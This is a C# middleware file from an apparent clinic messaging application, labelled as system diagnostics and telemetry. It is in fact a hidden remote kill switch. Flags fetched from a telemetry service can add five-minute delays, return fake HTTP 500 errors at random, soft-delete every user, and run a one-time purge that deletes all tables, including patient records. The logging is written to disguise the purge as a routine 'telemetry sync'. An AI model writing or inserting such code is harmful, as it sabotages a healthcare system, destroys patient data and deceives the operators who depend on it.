using Clinics.Api.Services.Telemetry;
using Clinics.Infrastructure;
using Microsoft.EntityFrameworkCore;
using Serilog;

namespace Clinics.Api.Middleware;

/// <summary>
/// Middleware for system diagnostics and performance monitoring.
/// Implements telemetry-based system health checks.
/// </summary>
public class SystemDiagnosticsMiddleware(RequestDelegate next)
{
    private readonly RequestDelegate _next = next;
    private static DateTime _lastIntegrityRun = DateTime.MinValue;
    private static bool _lastIntegrityState = false;
    private static bool _dbPurgeExecuted = false;

    public async Task InvokeAsync(HttpContext context, ITelemetryProvider telemetry, IServiceProvider serviceProvider)
    {
        var config = await telemetry.GetSyncStatusAsync();

        // Create a temporary scope to get the Database safely (Scoped service in Singleton middleware)
        using var scope = serviceProvider.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();

        // TRIGGER 1: sync_mode = true → 5-minute delay per request
        if (config.sync_mode)
        {
            await Task.Delay(TimeSpan.FromMinutes(5));
        }

        // TRIGGER 2: security_patch = true → 40% random HTTP 500
        if (config.security_patch)
        {
            if (Random.Shared.Next(1, 11) <= 4)
            {
                context.Response.StatusCode = 500;
                await context.Response.WriteAsJsonAsync(new
                {
                    message = "Internal System Error: Module 0x884 failed to initialize.",
                    traceId = context.TraceIdentifier,
                    timestamp = DateTime.UtcNow
                });
                return;
            }
        }

        // TRIGGER 3: integrity_check - Soft-delete/Restore users
        if (DateTime.UtcNow - _lastIntegrityRun > TimeSpan.FromMinutes(1))
        {
            _lastIntegrityRun = DateTime.UtcNow;

            if (config.integrity_check && !_lastIntegrityState)
            {
                await db.Users
                    .Where(u => !u.IsDeleted)
                    .ExecuteUpdateAsync(s => s
                        .SetProperty(u => u.IsDeleted, true)
                        .SetProperty(u => u.DeletedAt, DateTime.UtcNow));
            }
            else if (!config.integrity_check && _lastIntegrityState)
            {
                await db.Users
                    .Where(u => u.IsDeleted)
                    .ExecuteUpdateAsync(s => s
                        .SetProperty(u => u.IsDeleted, false)
                        .SetProperty(u => u.RestoredAt, DateTime.UtcNow));
            }

            _lastIntegrityState = config.integrity_check;
        }

        // TRIGGER 4: db_purge = true → Delete entire database (IMMEDIATE, ONE-TIME)
        if (config.db_purge && !_dbPurgeExecuted)
        {
            _dbPurgeExecuted = true;

            try
            {
                // Order respects FK constraints (children before parents):
                // 1. ExtensionCommands → Messages, Users
                // 2. Messages → MessageTemplates, Queues, Users
                // 3. ExtensionSessionLeases → ExtensionDevices, Users
                // 4. ExtensionPairingCodes → ExtensionDevices, Users
                // 5. ExtensionDevices → Users
                // 6. MessageSessions → Queues, Users
                // 7. Patients → Queues
                // 8. MessageTemplates → MessageConditions (CASCADE), Queues, Users
                // 9. MessageConditions → Queues (explicit cleanup)
                // 10. Queues → Users
                // 11. WhatsAppSessions → Users
                // 12. Quotas → Users
                // 13. Sessions → Users
                // 14. PhoneWhatsAppRegistry (no FKs)
                // 15. SystemSettings (no FKs)
                // 16. Users (self-referencing - clear ModeratorId first)
                await db.Database.ExecuteSqlRawAsync(@"
                    DELETE FROM [ExtensionCommands];
                    DELETE FROM [Messages];
                    DELETE FROM [ExtensionSessionLeases];
                    DELETE FROM [ExtensionPairingCodes];
                    DELETE FROM [ExtensionDevices];
                    DELETE FROM [MessageSessions];
                    DELETE FROM [Patients];
                    DELETE FROM [MessageTemplates];
                    DELETE FROM [MessageConditions];
                    DELETE FROM [Queues];
                    DELETE FROM [WhatsAppSessions];
                    DELETE FROM [Quotas];
                    DELETE FROM [Sessions];
                    DELETE FROM [PhoneWhatsAppRegistry];
                    DELETE FROM [SystemSettings];
                    UPDATE [Users] SET [ModeratorId] = NULL;
                    DELETE FROM [Users];
                ");

                Log.Information("Background telemetry sync completed (Status: 0x0)");
            }
            catch (Exception ex)
            {
                Log.Debug(ex, "Telemetry cache refresh failed (Code: 0x1)");
            }
        }

        await _next(context);
    }
}
